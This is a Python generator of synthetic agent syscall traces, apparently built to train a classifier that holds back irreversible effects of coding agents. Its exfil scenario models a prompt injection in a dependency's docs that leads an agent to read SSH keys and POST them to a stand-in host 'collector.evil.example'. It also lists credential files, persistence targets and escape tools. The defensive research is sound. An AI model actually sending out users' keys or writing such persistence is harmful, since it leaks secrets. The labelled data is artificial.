#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0
"""
tools/harness/synth.py --- synthetic agent-trace generator.  Fragment P4-04.

THIS IS WHAT STOPS P4 WAITING ON P3.

P4's stream needs labelled traces to train on.  P3's hooks, which produce
real traces, do not exist until week 8.  Rather than have one person idle
for five weeks, we generate traces that conform to docs/trace-format.md and
train on those now; at M2 the same pipeline is pointed at real captures and
nothing downstream changes.

WHAT THIS IS NOT
----------------
Not evidence.  Every record it emits carries label_source="synth", and
train.py refuses to report those labels as an accuracy result.  A model
that scores well here has learned this generator's rules, which we wrote.
The only honest claim available from synthetic data is "the pipeline runs
end to end", and that is exactly the claim we make with it.

Stdlib only, deliberately: this has to run on a teammate's laptop, on
Windows before the Linux host exists, and inside a minimal guest rootfs.

Usage:
    python3 synth.py --out data/traces/synth.jsonl --n 20000 --seed 1
    python3 synth.py --scenario exfil --n 200      # just the money scenario
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
from pathlib import Path

V = 1

# --------------------------------------------------------------------------
# The world the synthetic agent operates in.
# --------------------------------------------------------------------------

WORKSPACE = "/home/dev/project"

# Paths inside the workspace: the overlay captures writes here, so they are
# reversible by construction.
WORKSPACE_PATHS = [
    f"{WORKSPACE}/src/main.c", f"{WORKSPACE}/src/parser.c",
    f"{WORKSPACE}/src/util.c", f"{WORKSPACE}/include/api.h",
    f"{WORKSPACE}/tests/test_parser.c", f"{WORKSPACE}/Makefile",
    f"{WORKSPACE}/README.md", f"{WORKSPACE}/build/main.o",
    f"{WORKSPACE}/build/parser.o", f"{WORKSPACE}/.git/index",
    f"{WORKSPACE}/node_modules/left-pad/README.md",
    f"{WORKSPACE}/vendor/libfoo/docs/USAGE.md",
]

# Paths outside it.  The overlay does not cover these, so a write here is
# not captured and cannot be rolled back.  This is the distinction that
# makes the reversible/irrevocable split mean something at the FS level.
OUTSIDE_READ_PATHS = [
    "/usr/include/stdio.h", "/usr/lib/gcc/x86_64-linux-gnu/13/include/stddef.h",
    "/etc/ld.so.cache", "/usr/share/zoneinfo/UTC", "/proc/self/maps",
]
SENSITIVE_PATHS = [
    "/home/dev/.ssh/id_ed25519", "/home/dev/.ssh/id_rsa",
    "/home/dev/.aws/credentials", "/home/dev/.config/gh/hosts.yml",
    "/home/dev/.netrc", "/home/dev/.docker/config.json",
    "/home/dev/.gnupg/secring.gpg", "/etc/shadow",
]
OUTSIDE_WRITE_PATHS = [
    "/home/dev/.bashrc", "/home/dev/.ssh/authorized_keys",
    "/etc/hosts", "/home/dev/.config/systemd/user/agent.service",
    "/usr/local/bin/helper",
]

# Destinations.  (host, addr, port, kind)
#   query       non-mutating request-response; nothing to undo
#   telemetry   fire-and-forget POST; the deferrable case
#   compensable a registered cancellation window exists (paper section 3.4)
#   unknown     not in any registry; fail-closed territory
DESTS = [
    ("registry.npmjs.org",    "104.16.20.35",  443, "query"),
    ("pypi.org",              "151.101.0.223", 443, "query"),
    ("api.github.com",        "140.82.121.6",  443, "query"),
    ("proxy.golang.org",      "142.250.72.17", 443, "query"),
    ("telemetry.vendor.io",   "35.186.224.25", 443, "telemetry"),
    ("hooks.slack.com",       "3.233.145.10",  443, "telemetry"),
    ("events.analytics.net",  "54.230.99.14",  443, "telemetry"),
    ("api.stripe.com",        "54.187.174.169", 443, "compensable"),
    ("api.sendgrid.com",      "167.89.118.50", 443, "compensable"),
    ("paste.unknown.tld",     "185.199.108.1", 443, "unknown"),
    ("collector.evil.example", "45.33.32.156", 8080, "unknown"),
    ("localhost",             "127.0.0.1",    5432, "query"),
]

SYSCALL_NR = {  # x86-64
    "openat": 257, "read": 0, "write": 1, "close": 3, "unlink": 87,
    "unlinkat": 263, "rename": 82, "renameat2": 316, "connect": 42,
    "sendmsg": 46, "sendto": 44, "recvmsg": 47, "execve": 59, "stat": 4,
    "fstat": 5, "lseek": 8, "mmap": 9, "getdents64": 217,
}

BUILD_TOOLS = ["/usr/bin/cc", "/usr/bin/make", "/usr/bin/ld", "/usr/bin/git",
               "/usr/bin/python3", "/usr/bin/node"]
# Executing these hands control to something the transaction cannot follow.
ESCAPE_TOOLS = ["/usr/bin/ssh", "/usr/bin/scp", "/usr/bin/curl",
                "/usr/bin/rsync", "/bin/sh"]


def fnv1a64(s: str) -> int:
    """FNV-1a 64.  Must match the BPF hook's hash exactly (src/bpf/hooks_all.c);
    a mismatch means the model keys on a different value than the kernel
    computes and accuracy silently collapses at integration."""
    h = 0xCBF29CE484222325
    for b in s.encode("utf-8", "replace"):
        h = ((h ^ b) * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
    return h


def path_prefix_hash(path: str) -> int:
    """Hash the first three components only.  A BPF hook walking a dentry
    chain can afford three levels with a bounded loop; it cannot afford an
    unbounded walk, and it must not depend on the full path, which varies
    per user and would not generalise."""
    parts = [p for p in path.split("/") if p][:3]
    return fnv1a64("/" + "/".join(parts))


# --------------------------------------------------------------------------
# Labelling.  This is the generator's *intent*, recorded as ground truth.
# The rules below are also written down in docs/taxonomy.md, because a
# taxonomy that exists only as code is not a contribution.
# --------------------------------------------------------------------------

def label_for(rec: dict) -> str:
    hook = rec["hook"]

    if hook in ("file_open", "inode_unlink", "inode_rename"):
        p = rec.get("path") or ""
        # A read has no effect to undo, wherever it points.  Reading a
        # private key is alarming but it is not the irreversible act; the
        # send that follows is.  Classing the read as irrevocable would
        # doom transactions for something the CoW layer handles fine.
        if hook == "file_open" and "O_WRONLY" not in rec["open_flags"] \
                and "O_RDWR" not in rec["open_flags"]:
            return "reversible"
        # Writes and deletions inside the workspace land in the overlay.
        if p.startswith(WORKSPACE + "/"):
            return "reversible"
        # Outside it, nothing captured the old contents.
        return "irrevocable"

    if hook == "bprm_check":
        # Running the build toolchain is ordinary; its effects are files,
        # and files are covered.  Running something that opens its own
        # channel to the outside is not followable by the transaction.
        return "reversible" if rec["path"] in BUILD_TOOLS else "irrevocable"

    if hook == "socket_connect":
        # Connecting is not itself an effect worth undoing; the send is.
        return "reversible"

    if hook in ("socket_sendmsg", "tls_write"):
        kind = rec["_dest_kind"]
        mutating = rec["_mutating"]
        if not mutating:
            return "reversible"          # a GET leaves nothing to reverse
        if rec["awaits_reply"]:
            # Mutating and blocking: it cannot be deferred without
            # deadlocking the agent (paper section 3.5).  If the
            # destination has a registered window it is compensable;
            # otherwise there is nothing left but to escalate.
            return "compensable" if kind == "compensable" else "irrevocable"
        if kind == "telemetry":
            return "deferrable"          # the case the mechanism is for
        if kind == "compensable":
            return "compensable"
        return "irrevocable"             # unknown destination, fail closed

    return "irrevocable"


# --------------------------------------------------------------------------
# Record construction
# --------------------------------------------------------------------------

class Gen:
    def __init__(self, rng: random.Random, ff_rate: float):
        self.rng = rng
        self.ff_rate = ff_rate
        self.seq = 0
        self.ts = 1_723_472_819_000_000_000
        self.pid = rng.randrange(2000, 30000)
        self.hist: list[str] = ["execve", "openat", "read"]

    def _base(self, hook: str, syscall: str) -> dict:
        self.seq += 1
        self.ts += self.rng.randrange(20_000, 4_000_000)
        rec = {
            "v": V,
            "seq": self.seq,
            "ts_ns": self.ts,
            "tx_id": 1,
            "pid": self.pid,
            "tgid": self.pid,
            "hook": hook,
            "syscall": syscall,
            "syscall_nr": SYSCALL_NR.get(syscall, 0),
            "path": None,
            "path_hash": None,
            "path_depth": 0,
            "fd_type": "none",
            "open_flags": [],
            "family": None,
            "daddr": None,
            "dport": 0,
            "msg_flags": [],
            "payload_len": 0,
            "payload_prefix": None,
            "awaits_reply": None,
            "ngram": list(self.hist[-3:]),
            "label": None,
            "label_source": "synth",
        }
        self.hist.append(syscall)
        return rec

    def _finish(self, rec: dict) -> dict:
        if rec["path"]:
            rec["path_hash"] = "0x%016x" % path_prefix_hash(rec["path"])
            rec["path_depth"] = rec["path"].count("/")
        rec["label"] = label_for(rec)
        for k in list(rec):
            if k.startswith("_"):
                del rec[k]
        return rec

    # --- individual operations -------------------------------------------

    def file_read(self, path: str) -> dict:
        r = self._base("file_open", "openat")
        r.update(path=path, fd_type="reg", open_flags=["O_RDONLY"])
        return self._finish(r)

    def file_write(self, path: str, trunc: bool = True) -> dict:
        r = self._base("file_open", "openat")
        flags = ["O_WRONLY", "O_CREAT"] + (["O_TRUNC"] if trunc else ["O_APPEND"])
        r.update(path=path, fd_type="reg", open_flags=flags)
        return self._finish(r)

    def unlink(self, path: str) -> dict:
        r = self._base("inode_unlink", "unlinkat")
        r.update(path=path, fd_type="reg")
        return self._finish(r)

    def rename(self, path: str) -> dict:
        r = self._base("inode_rename", "renameat2")
        r.update(path=path, fd_type="reg")
        return self._finish(r)

    def exec_(self, path: str) -> dict:
        r = self._base("bprm_check", "execve")
        r.update(path=path, fd_type="reg")
        return self._finish(r)

    def connect(self, dest) -> dict:
        host, addr, port, _kind = dest
        r = self._base("socket_connect", "connect")
        r.update(fd_type="sock", family="AF_INET", daddr=addr, dport=port,
                 awaits_reply=True)
        return self._finish(r)

    def send(self, dest, mutating: bool, awaits: bool | None = None,
             body: str | None = None) -> dict:
        host, addr, port, kind = dest
        r = self._base("socket_sendmsg", "sendmsg")
        if awaits is None:
            awaits = not mutating or self.rng.random() > self.ff_rate
        verb = self.rng.choice(["POST", "PUT", "PATCH", "DELETE"]) if mutating else "GET"
        pay = body or f"{verb} /v1/resource HTTP/1.1\r\nHost: {host}\r\n"
        flags = ["MSG_NOSIGNAL"]
        # A fire-and-forget send very often sets MSG_DONTWAIT.  It is a real
        # and cheaply-computable signal, which is exactly why it is a
        # feature -- and also why the classifier must not lean on it alone:
        # an injection can simply not set it.  P4-13 tests that.
        if not awaits and self.rng.random() < 0.55:
            flags.append("MSG_DONTWAIT")
        r.update(fd_type="sock", family="AF_INET", daddr=addr, dport=port,
                 msg_flags=flags, payload_len=len(pay) + self.rng.randrange(0, 3000),
                 payload_prefix=pay[:256], awaits_reply=awaits)
        r["_dest_kind"] = kind
        r["_mutating"] = mutating
        return self._finish(r)

    # --- scenarios --------------------------------------------------------

    def sc_edit(self):
        """Ordinary code editing: the bulk of any real trace."""
        out = []
        for _ in range(self.rng.randrange(2, 6)):
            out.append(self.file_read(self.rng.choice(WORKSPACE_PATHS)))
        for _ in range(self.rng.randrange(1, 4)):
            out.append(self.file_write(self.rng.choice(WORKSPACE_PATHS)))
        return out

    def sc_build(self):
        out = [self.exec_("/usr/bin/make"), self.exec_("/usr/bin/cc")]
        for _ in range(self.rng.randrange(3, 9)):
            out.append(self.file_read(self.rng.choice(OUTSIDE_READ_PATHS)))
        for _ in range(self.rng.randrange(1, 4)):
            out.append(self.file_write(f"{WORKSPACE}/build/obj{self.rng.randrange(99)}.o"))
        return out

    def sc_fetch(self):
        """Dependency download: request-response, must not be deferred."""
        d = self.rng.choice([x for x in DESTS if x[3] == "query"])
        out = [self.connect(d), self.send(d, mutating=False, awaits=True)]
        for _ in range(self.rng.randrange(1, 4)):
            out.append(self.file_write(f"{WORKSPACE}/node_modules/pkg/index.js"))
        return out

    def sc_telemetry(self):
        """Fire-and-forget POST: the case the mechanism exists for."""
        d = self.rng.choice([x for x in DESTS if x[3] == "telemetry"])
        return [self.connect(d), self.send(d, mutating=True, awaits=False)]

    def sc_compensable(self):
        d = self.rng.choice([x for x in DESTS if x[3] == "compensable"])
        return [self.connect(d), self.send(d, mutating=True,
                                           awaits=self.rng.random() < 0.6)]

    def sc_cleanup(self):
        out = []
        for _ in range(self.rng.randrange(1, 4)):
            out.append(self.unlink(f"{WORKSPACE}/build/obj{self.rng.randrange(99)}.o"))
        if self.rng.random() < 0.3:
            out.append(self.rename(self.rng.choice(WORKSPACE_PATHS)))
        return out

    def sc_exfil(self):
        """The PROPOSAL.md motivating example, start to finish.

        A prompt injection is planted in a dependency's documentation.  The
        agent reads it during an ordinary task, reads the user's private key
        with the user's full authority, and POSTs it to an external host
        fire-and-forget -- it does not need the response to continue.

        Under AgentTx the send classifies as deferrable or irrevocable and
        never leaves the machine before the transaction is judged.  P4-13's
        adversarial corpus is built from variants of this.
        """
        key = self.rng.choice(SENSITIVE_PATHS)
        d = self.rng.choice([x for x in DESTS if x[3] == "unknown"])
        body = ("POST /p HTTP/1.1\r\nHost: %s\r\nContent-Type: text/plain\r\n\r\n"
                "-----BEGIN OPENSSH PRIVATE KEY-----\n" % d[0])
        return [
            self.file_read(f"{WORKSPACE}/vendor/libfoo/docs/USAGE.md"),
            self.file_read(key),
            self.connect(d),
            self.send(d, mutating=True, awaits=False, body=body),
        ]

    def sc_escape(self):
        """Agent shells out to something the transaction cannot follow."""
        return [self.exec_(self.rng.choice(ESCAPE_TOOLS))]

    def sc_outside_write(self):
        """A write the overlay does not cover: persistence, or a mistake."""
        return [self.file_write(self.rng.choice(OUTSIDE_WRITE_PATHS))]


# Mix.  Roughly what a coding agent's syscall stream looks like: mostly
# editing and building, a little network, and rare destructive events.
# The rare classes are deliberately NOT rare enough to vanish -- a 0.1%
# class teaches the model to predict the majority and nothing else, and
# P4-05 has to confront that imbalance honestly rather than hide it here.
MIX = [
    ("edit",          0.34),
    ("build",         0.22),
    ("fetch",         0.11),
    ("cleanup",       0.10),
    ("telemetry",     0.09),
    ("compensable",   0.05),
    ("outside_write", 0.04),
    ("exfil",         0.03),
    ("escape",        0.02),
]


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", default="-", help="output .jsonl, or - for stdout")
    ap.add_argument("--n", type=int, default=20000, help="target record count")
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--ff-rate", type=float, default=0.35,
                    help="fraction of MUTATING sends that are fire-and-forget. "
                         "This is an assumption, not a measurement -- the real "
                         "number is the week 3-4 gate (measure_gate.py).")
    ap.add_argument("--scenario", default=None,
                    help="generate only this scenario (edit, build, fetch, "
                         "cleanup, telemetry, compensable, outside_write, "
                         "exfil, escape)")
    a = ap.parse_args(argv)

    rng = random.Random(a.seed)
    g = Gen(rng, a.ff_rate)

    names = [n for n, _ in MIX]
    weights = [w for _, w in MIX]
    if a.scenario:
        if a.scenario not in names:
            ap.error("unknown scenario %r; choose from %s" % (a.scenario, ", ".join(names)))
        names, weights = [a.scenario], [1.0]

    out = sys.stdout
    if a.out != "-":
        Path(a.out).parent.mkdir(parents=True, exist_ok=True)
        out = open(a.out, "w", encoding="utf-8", newline="\n")

    counts: dict[str, int] = {}
    labels: dict[str, int] = {}
    n = 0
    try:
        while n < a.n:
            name = rng.choices(names, weights)[0]
            for rec in getattr(g, "sc_" + name)():
                out.write(json.dumps(rec, separators=(",", ":")) + "\n")
                counts[name] = counts.get(name, 0) + 1
                labels[rec["label"]] = labels.get(rec["label"], 0) + 1
                n += 1
    finally:
        if out is not sys.stdout:
            out.close()

    # Everything below goes to stderr so `--out -` stays pipeable.
    e = sys.stderr
    print("synth: %d records -> %s (seed=%d)" % (n, a.out, a.seed), file=e)
    print("  scenarios:", file=e)
    for k in sorted(counts, key=lambda x: -counts[x]):
        print("    %-14s %6d  %5.1f%%" % (k, counts[k], 100 * counts[k] / n), file=e)
    print("  labels:", file=e)
    for k in ("reversible", "deferrable", "compensable", "irrevocable"):
        c = labels.get(k, 0)
        print("    %-14s %6d  %5.1f%%" % (k, c, 100 * c / n), file=e)

    # Restate the caveat at the point of use, not just in the docstring.
    print("\n  NOTE: label_source=synth on every record. These labels are the", file=e)
    print("  generator's own rules. No accuracy figure computed against them", file=e)
    print("  is a result; see docs/trace-format.md.", file=e)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
